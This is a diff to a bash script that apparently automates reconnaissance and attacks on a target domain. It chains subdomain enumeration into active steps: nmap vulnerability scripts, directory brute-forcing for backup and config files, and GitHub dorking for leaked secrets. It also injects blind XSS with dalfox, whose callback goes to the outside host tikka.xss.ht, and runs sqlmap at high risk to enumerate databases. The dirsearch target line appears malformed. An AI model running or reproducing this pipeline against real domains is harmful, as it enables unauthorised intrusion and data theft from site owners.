@@ -17,7 +17,6 @@ domain=$1
 
 mkdir -p /root/Projects/$domain/
 
-
 echo "Getting domains from crtsh"
 
 python3 /root/crtsh/crtsh.py -d $1 | anew /root/Projects/$domain/subdomains.txt
@@ -42,6 +41,11 @@ echo -e "\n Getting domains from Amass"
 
 amass enum -passive -d $1 -o /root/Projects/$domain/amass_subdomains.txt
 
+echo -e "\n Getting domains for Nmap scan into allsubdomain.txt"
+
+cat /root/Projects/$domain/subdomains.txt  /root/Projects/$domain/sublister_subdomains.txt  /root/Projects/$domain/amass_subdomains.txt  /root/Projects/$domain/findomain_subdomains.txt | anew allsubdomains.txt
+
+
 echo -e "\n Getting domains Sorted into sorted_subdomain.txt"
 
 cat /root/Projects/$domain/subdomains.txt /root/Projects/$domain/sublister_subdomains.txt  /root/Projects/$domain/amass_subdomains.txt /root/Projects/$domain/findomain_subdomains.txt| httprobe | sort -u > /root/Projects/$domain/sorted_subdomain.txt
@@ -49,6 +53,14 @@ cat /root/Projects/$domain/subdomains.txt /root/Projects/$domain/sublister_subdo
 echo -e "\n Getting all live domains into live_domains.txt"
 
 cat /root/Projects/$domain/sorted_subdomain.txt | httpx | anew /root/Projects/$domain/live_domains.txt
+
+echo -e "\n NMap Scanning in Progress"
+
+nmap -sV -iL allsubdomains.txt -oN scanned-port.txt --script=vuln
+
+echo -e "\n Doing a complete directory Brute Force"
+
+python3 /root/Tools/dirsearch/dirsearch.py -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json -u https://+$domain+.com
 
 echo -e "\n Getting all URLS using waybackurls"
 
@@ -98,16 +110,16 @@ cat /root/Projects/$domain/sorted_subdomain.txt | httpx | python3  /root/Tools/s
 
 echo -e "\n Checking for XSS"
 
-cat All_Urls.txt | httprobe | httpx |gf xss | kxss | sed 's/=.*/=/' | sed 's/^.*http/http/' | dalfox pipe -b https://tikka.xss.ht
+cat /root/Projects/$domain/All_Urls.txt | httprobe | httpx |gf xss | kxss | sed 's/=.*/=/' | sed 's/^.*http/http/' | dalfox pipe -b https://tikka.xss.ht
 
 echo -e "\n Checking for SQLI"
 
-gf sqli /root/Projects/$domain/All_Urls.txt >> sqli.txt ; sqlmap -m sqli.txt --dbs --banner --batch --risk 3 --level 3
+gf sqli /root/Projects/$domain/All_Urls.txt >> sqli.txt ; sqlmap -m /root/Projects/$domain/sqli.txt --dbs --banner --batch --risk 3 --level 3
 
 echo -e "\n Checking Nuclei Results"
 
 nuclei -l /root/Projects/$domain/sorted_subdomain.txt -o /root/Projects/$domain/nuclei_result.txt
 
-#echo -e "\n Checking for GitHub Dorks"
+echo -e "\n Checking for GitHub Dorks"
 
-#python3  /root/el_cazador/GitDorker/GitDorker.py -t  "Add Your GitHub Token"  -org $domain -d  /root/el_cazador/gitdork.txt  -o  /root/Projects/$domain/githubdork.txt
+python3  /root/el_cazador/GitDorker/GitDorker.py -t  "Add Your GitHub Token"  -org $domain -d  /root/el_cazador/gitdork.txt  -o  /root/Projects/$domain/githubdork.txt
